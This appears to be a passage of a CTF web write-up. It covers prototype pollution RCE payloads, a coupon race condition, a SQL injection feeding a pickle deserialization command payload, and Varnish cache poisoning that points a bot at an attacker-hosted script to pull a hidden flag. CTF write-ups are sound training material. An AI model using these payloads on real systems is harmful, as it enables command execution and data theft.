+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/calculate&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> student = <span class="hljs-title class_">ObjectHelper</span>.<span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>    <span class="hljs-comment">// ...</span><br>&#125;);<br><span class="hljs-comment">// ObjectHelper.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-title function_">isObject</span>(<span class="hljs-params">obj</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;function&#x27;</span> || <span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;object&#x27;</span>;<br>    &#125;,<br><br>    <span class="hljs-title function_">isValidKey</span>(<span class="hljs-params">key</span>) &#123;<br>        <span class="hljs-keyword">return</span> key !== <span class="hljs-string">&#x27;__proto__&#x27;</span>;<br>    &#125;,<br><br>    <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isValidKey</span>(key))&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isObject</span>(target[key]) &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isObject</span>(source[key])) &#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">merge</span>(target[key], source[key]);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    target[key] = source[key];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> target;<br>    &#125;,<br><br>    <span class="hljs-title function_">clone</span>(<span class="hljs-params">target</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">merge</span>(&#123;&#125;, target);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Obviously this router contains a prototype pollution vul.</p>
+<p>although it bans the keyword <code>__proto__</code>, we can bypass it using <code>constructor.prototype</code></p>
+<p>Let’s leverage the prototype pollution to gain RCE</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;execPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/cat&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;execArgv&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;./flag_e1T6f&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;aaa&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;).toString());//&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;-r /proc/self/environ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>👉<a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">FMI</a></p>
+<h1 id="Diogenes’-Rage"><a href="#Diogenes’-Rage" class="headerlink" title="Diogenes’ Rage"></a>Diogenes’ Rage</h1><blockquote>
+<p>Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you don’t like with the money you don’t have for the people you don’t like. You’re Jack’s raging bile duct.</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/purchase&#x27;</span>, <span class="hljs-title class_">AuthMiddleware</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>	<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">getUser</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>)<br>		.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">async</span> user =&gt; &#123;<br>			<span class="hljs-keyword">if</span> (user === <span class="hljs-literal">undefined</span>) &#123;<br>				<span class="hljs-keyword">await</span> db.<span class="hljs-title function_">registerUser</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>);<br>				user = &#123; <span class="hljs-attr">username</span>: req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>, <span class="hljs-attr">balance</span>: <span class="hljs-number">0.00</span>, <span class="hljs-attr">coupons</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;;<br>			&#125;<br>			<span class="hljs-keyword">const</span> &#123; item &#125; = req.<span class="hljs-property">body</span>;<br>			<span class="hljs-keyword">if</span> (item) &#123;<br>				<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">getProduct</span>(item)<br>					.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">product</span> =&gt;</span> &#123;<br>						<span class="hljs-keyword">if</span> (product == <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;Invalid item code supplied!&quot;</span>));<br>						<span class="hljs-keyword">if</span> (product.<span class="hljs-property">price</span> &lt;= user.<span class="hljs-property">balance</span>) &#123;<br>							newBalance = <span class="hljs-built_in">parseFloat</span>(user.<span class="hljs-property">balance</span> - product.<span class="hljs-property">price</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);<br>							<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">setBalance</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>, newBalance)<br>								.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>									<span class="hljs-keyword">if</span> (product.<span class="hljs-property">item_name</span> == <span class="hljs-string">&#x27;C8&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>										<span class="hljs-attr">flag</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/app/flag&#x27;</span>).<span class="hljs-title function_">toString</span>(),<br>										<span class="hljs-attr">message</span>: <span class="hljs-string">`Thank you for your order! $<span class="hljs-subst">$&#123;newBalance&#125;</span> coupon credits left!`</span><br>									&#125;)<br>									res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">`Thank you for your order! $<span class="hljs-subst">$&#123;newBalance&#125;</span> coupon credits left!`</span>))<br>								&#125;);<br>						&#125;<br>						<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;Insufficient balance!&quot;</span>));<br><br>					&#125;)<br>			&#125;<br>			<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing required parameters!&#x27;</span>));<br>		&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>Buy C8 item attached with flag!</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/coupons/apply&#x27;</span>, <span class="hljs-title class_">AuthMiddleware</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>	<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">getUser</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>)<br>		.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">async</span> user =&gt; &#123;<br>			<span class="hljs-keyword">if</span> (user === <span class="hljs-literal">undefined</span>) &#123;<br>				<span class="hljs-keyword">await</span> db.<span class="hljs-title function_">registerUser</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>);<br>				user = &#123; <span class="hljs-attr">username</span>: req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>, <span class="hljs-attr">balance</span>: <span class="hljs-number">0.00</span>, <span class="hljs-attr">coupons</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;;<br>			&#125;<br>			<span class="hljs-keyword">const</span> &#123; coupon_code &#125; = req.<span class="hljs-property">body</span>;<br>			<span class="hljs-keyword">if</span> (coupon_code) &#123;<br>				<span class="hljs-keyword">if</span> (user.<span class="hljs-property">coupons</span>.<span class="hljs-title function_">includes</span>(coupon_code)) &#123;<br>					<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;This coupon is already redeemed!&quot;</span>));<br>				&#125;<br>				<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">getCouponValue</span>(coupon_code)<br>					.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">coupon</span> =&gt;</span> &#123;<br>						<span class="hljs-keyword">if</span> (coupon) &#123;<br>							<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">addBalance</span>(user.<span class="hljs-property">username</span>, coupon.<span class="hljs-property">value</span>)<br>								.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>									db.<span class="hljs-title function_">setCoupon</span>(user.<span class="hljs-property">username</span>, coupon_code)<br>										.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">`$<span class="hljs-subst">$&#123;coupon.value&#125;</span> coupon redeemed successfully! Please select an item for order.`</span>)))<br>								&#125;)<br>								.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;Failed to redeem the coupon!&quot;</span>)));<br>						&#125;<br>						res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;No such coupon exists!&quot;</span>));<br>					&#125;)<br>			&#125;<br>			<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&quot;Missing required parameters!&quot;</span>));<br>		&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>At beginning, we only have one coupon which can be exchanged for ￥1</p>
+<p>Checking through the process of <em>coupon redemption</em>, I divide it into 4 phrase</p>
+<ol>
+<li>check if user’s used coupon contains this coupon code</li>
+<li>get the corresponding value of the coupon code</li>
+<li>add user’s balance</li>
+<li>mark that the user already used this coupon</li>
+</ol>
+<p>There is a gap between 1 and 4 (2 and 3 are synchronization operations and could consume some time). Let’s consider Race Condition.</p>
+<p>Use <code>Turbo Intruder</code>(A plugin for Burp) to conduct a high concurrency access which will result in race condition.</p>
+<p><img src="/./../img/image-20230811152803863.png" srcset="/img/loading.gif" lazyload alt="image-20230811152803863"></p>
+<p><img src="/./../img/image-20230811152525427.png" srcset="/img/loading.gif" lazyload alt="image-20230811152525427"></p>
+<h1 id="C-O-P"><a href="#C-O-P" class="headerlink" title="C.O.P"></a>C.O.P</h1><blockquote>
+<p>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!</p>
+</blockquote>
+<p>Pickle Deserialization Vuln.</p>
+<p>The id parameter is injectable</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@web.route(<span class="hljs-params"><span class="hljs-string">&#x27;/view/&lt;product_id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">product_details</span>(<span class="hljs-params">product_id</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;item.html&#x27;</span>, product=shop.select_by_id(product_id))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">shop</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_by_id</span>(<span class="hljs-params">product_id</span>):<br>        <span class="hljs-keyword">return</span> query_db(<span class="hljs-string">f&quot;SELECT data FROM products WHERE id=&#x27;<span class="hljs-subst">&#123;product_id&#125;</span>&#x27;&quot;</span>, one=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+
+<p>The query result will be passed to a user-defined filter before rendering.</p>
+<p>pickle module will load the data after base64 decode.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@web.route(<span class="hljs-params"><span class="hljs-string">&#x27;/view/&lt;product_id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">product_details</span>(<span class="hljs-params">product_id</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;item.html&#x27;</span>, product=shop.select_by_id(product_id))<br><br><span class="hljs-meta">@app.template_filter(<span class="hljs-params"><span class="hljs-string">&#x27;pickle&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pickle_loads</span>(<span class="hljs-params">s</span>):<br>	<span class="hljs-keyword">return</span> pickle.loads(base64.b64decode(s))<br></code></pre></td></tr></table></figure>
+
+<p>picke is a stack-based language which can directly execute our command.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;echo `cat flag.txt` &gt; ./application/static/flag&#x27;)&quot;</span>,))<br><br><br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)).decode())<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>&#x2F;view&#x2F;0’ union select ‘payload</p>
+</blockquote>
+<p>then download the flag file <code>/static/flag</code></p>
+<h1 id="EasterBunny"><a href="#EasterBunny" class="headerlink" title="EasterBunny"></a>EasterBunny</h1><blockquote>
+<p>It’s that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny’s helpers are watching!</p>
+</blockquote>
+<p>We can post message for Easter wishes.</p>
+<p>Then the server will insert our message into the database and the robot will visit the new letter.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; message &#125; = req.<span class="hljs-property">body</span>;<br><br>    <span class="hljs-keyword">if</span> (message) &#123;<br>        <span class="hljs-keyword">return</span> db.<span class="hljs-title function_">insertMessage</span>(message)<br>            .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">async</span> inserted =&gt; &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    botVisiting = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">await</span> <span class="hljs-title function_">visit</span>(<span class="hljs-string">`http://127.0.0.1/letters?id=<span class="hljs-subst">$&#123;inserted.lastID&#125;</span>`</span>, authSecret);<br>                    botVisiting = <span class="hljs-literal">false</span>;<br>                &#125;<br>        <span class="hljs-comment">// ...</span><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>We can visit the posted message with some restriction.</p>
+<p>Only admin can view the hidden message where flag exists.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/message/:id&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>        <span class="hljs-keyword">const</span> &#123; count &#125; = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getMessageCount</span>();<br>        <span class="hljs-keyword">const</span> message = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getMessage</span>(id);<br><br>        <span class="hljs-keyword">if</span> (!message) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Can&#x27;t find this note!&quot;</span>,<br>            <span class="hljs-attr">count</span>: count<br>        &#125;);<br><br>        <span class="hljs-keyword">if</span> (message.<span class="hljs-property">hidden</span> &amp;&amp; !<span class="hljs-title function_">isAdmin</span>(req))<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Sorry, this letter has been hidden by the easter bunny&#x27;s helpers!&quot;</span>,<br>                <span class="hljs-attr">count</span>: count<br>            &#125;);<br><br>        <span class="hljs-keyword">if</span> (message.<span class="hljs-property">hidden</span>) res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;Cache-Control&quot;</span>, <span class="hljs-string">&quot;private, max-age=0, s-maxage=0 ,no-cache, no-store&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">message</span>: message.<span class="hljs-property">message</span>,<br>            <span class="hljs-attr">count</span>: count,<br>        &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<span class="hljs-comment">//...&#125;</span><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>Spontaneously, XSS is taken into consideration. But I failed. Let’s see how our posted message display in the browser.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// get the id parameter from the URL</span><br><span class="hljs-keyword">let</span> currentLetter = <span class="hljs-built_in">parseInt</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(location.<span class="hljs-property">href</span>).<span class="hljs-property">searchParams</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>) ?? <span class="hljs-string">&#x27;1&#x27;</span>);<br><br><span class="hljs-comment">// fetch message from server</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/message/<span class="hljs-subst">$&#123;currentLetter&#125;</span>`</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-comment">//...</span><br>      letterText.<span class="hljs-property">value</span> = data.<span class="hljs-property">message</span>;<br>    &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>Seems like the message is definitely treated as string, so there is probably no XSS vuln.</p>
+<p>Notice that the server uses a cache technique – varnish</p>
+<p><img src="/./../img/image-20230813161151800.png" srcset="/img/loading.gif" lazyload alt="image-20230813161151800"></p>
+<p>In the config file, we can see that it hashes <em>host</em> and <em>url</em> in the http request.</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sub vcl_hash &#123;<br>    hash<span class="hljs-constructor">_data(<span class="hljs-params">req</span>.<span class="hljs-params">url</span>)</span>;<br>    <span class="hljs-keyword">if</span> (req.http.host) &#123;<br>        hash<span class="hljs-constructor">_data(<span class="hljs-params">req</span>.<span class="hljs-params">http</span>.<span class="hljs-params">host</span>)</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        hash<span class="hljs-constructor">_data(<span class="hljs-params">server</span>.<span class="hljs-params">ip</span>)</span>;<br>    &#125;<br>    return (lookup);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230813190709325.png" srcset="/img/loading.gif" lazyload alt="image-20230813190709325"></p>
+<p>If we can poison the cache, the bot will load our constructed data.</p>
+<p>But how? To poison what the bot get from the cache, the varnish cache table needs to contain the key <code>hash(url+127.0.0.1)</code>. Since varnish uses <code>req.http.host</code> to hash, we can tamper the host header field.</p>
+<p>So far we are able to create the hash of the bot’s ip and request url in the cache table, but what kind of content can we poison?</p>
+<p>The server renders html by padding a cdn parameter.</p>
+<p><code>req.hostname</code> can be tampered by <code>X-Forwarded-Host</code> header in http request when <code>trust proxy=false</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;trust proxy&#x27;</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">PROXY</span> !== <span class="hljs-string">&#x27;false&#x27;</span>);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/letters&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;viewletters.html&quot;</span>, &#123;<br>        <span class="hljs-attr">cdn</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;req.protocol&#125;</span>://<span class="hljs-subst">$&#123;req.hostname&#125;</span>:<span class="hljs-subst">$&#123;req.headers[<span class="hljs-string">&quot;x-forwarded-port&quot;</span>] ?? <span class="hljs-number">80</span>&#125;</span>/static/`</span>,<br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">// base.html</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123;cdn&#125;&#125;&quot;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>we can poison the href attribute of the base tag to let it points to our evil server.</p>
+<p>Our server returns some evil js code.</p>
+<p><code>viewletters.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">get_msg</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1/message/3&quot;</span>)  <span class="hljs-comment">// get the hidden flag.</span><br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>      msg = data.<span class="hljs-property">message</span>;<br>      <span class="hljs-title function_">loadLetter</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadLetter</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/message/<span class="hljs-subst">$&#123;msg&#125;</span>`</span>)<br>&#125;<br><br><span class="hljs-title function_">get_msg</span>();<br></code></pre></td></tr></table></figure>
+
